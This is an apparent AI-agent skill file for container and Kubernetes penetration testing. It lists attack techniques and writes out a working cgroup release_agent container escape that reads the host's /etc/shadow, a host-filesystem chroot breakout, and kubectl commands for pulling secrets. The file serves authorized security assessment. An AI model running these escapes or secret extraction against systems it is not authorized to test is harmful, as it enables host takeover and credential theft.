---
name: container-security-testing
description: "Use when testing container and Kubernetes security."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [container-security, kubernetes-pentest, Docker, kube-hunter, admission-control]
    related_skills: [container-security-hardening, cloud-penetration-testing, privilege-escalation-techniques, lateral-movement-pivoting]
---

# Container Security Testing

Testing container and Kubernetes security — from Docker breakout and image scanning through Kubernetes RBAC abuse, pod security, and cluster compromise.

## When to Use

- Assessing Docker/Kubernetes security posture
- Testing container isolation and breakout
- Enumerating Kubernetes RBAC permissions
- Exploiting misconfigured admission controllers
- Auditing container images for vulnerabilities

## Container Attack Techniques

```python
CONTAINER_ATTACKS = {
    'docker_escape': 'Mount host filesystem, abuse capabilities (SYS_ADMIN), cgroup escape',
    'k8s_rbac_abuse': 'Check permissions: list pods, exec into pods, create pods with hostNetwork',
    'k8s_secrets': 'Read secrets from mounted volumes, API server, or etcd',
    'kubelet_api': 'Kubelet API on port 10250 — unauthenticated pod exec (anonymous-auth enabled)',
    'dashboard_access': 'Kubernetes Dashboard misconfiguration — admin access without auth',
    'admission_bypass': 'Bypass PodSecurityPolicy, OPA Gatekeeper with elevated permissions',
}

# Docker escape via host mount
DOCKER_ESCAPE = """
# Run container with host filesystem mounted
docker run -v /:/mnt/host --rm -it ubuntu chroot /mnt/host

# Escape with SYS_ADMIN capability
capsh --print
mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
host_path=`sed -n 's/.*perdir=([^,]*).*/1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgroup/x/release_agent
echo '#!/bin/sh' > /cmd; echo "cat /etc/shadow > $host_path/output" >> /cmd
sh -c "echo 0 > /tmp/cgroup/x/cgroup.procs"
sleep 1; cat /output
"""

# kubectl enumeration
KUBECTL_ENUM = [
    "kubectl auth can-i --list — check permissions",
    "kubectl get pods --all-namespaces — list all pods",
    "kubectl get secrets — extract secrets",
    "kubectl run test --image=busybox --rm -it --restart=Never -- sh — exec pod",
]
```

## Verification Checklist

- [ ] Container breakout tested (mount escape, capability abuse)
- [ ] Image vulnerability scan (Trivy, Grype)
- [ ] Kubernetes RBAC permissions enumerated
- [ ] Secrets accessible from pod/service account
- [ ] Kubelet API (port 10250) checked for anonymous access
- [ ] Network policies tested (can pods reach each other?)
- [ ] Admission controllers audited
- [ ] etcd access (if Kubernetes master accessible)
- [ ] Cloud provider metadata accessible from pod
